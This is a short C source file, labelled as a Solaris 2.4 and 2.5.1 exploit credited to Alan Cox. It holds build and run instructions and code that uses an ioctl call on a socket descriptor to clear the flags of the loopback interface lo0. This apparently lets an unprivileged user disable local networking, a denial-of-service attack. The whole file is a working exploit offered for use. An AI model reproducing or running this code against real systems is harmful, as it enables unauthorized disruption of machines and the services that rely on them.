/*
     Solaris 2.4, 2.5.1 exploit by Alan Cox.
     ---------------------------------------
 
      cc solarisuck.c -o solarisuck -lsocket
      rsh localhost ./solarisuck
 
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sockio.h>
#include <net/if.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
  struct ifreq please_break_me;

  strcpy( please_break_me.ifr_name, "lo0");
  please_break_me.ifr_flags=0;

  if(ioctl(0, SIOCSIFFLAGS, &please_break_me)==-1)
    perror("Damn it didnt work. Obviously not Solaris ;)");
}
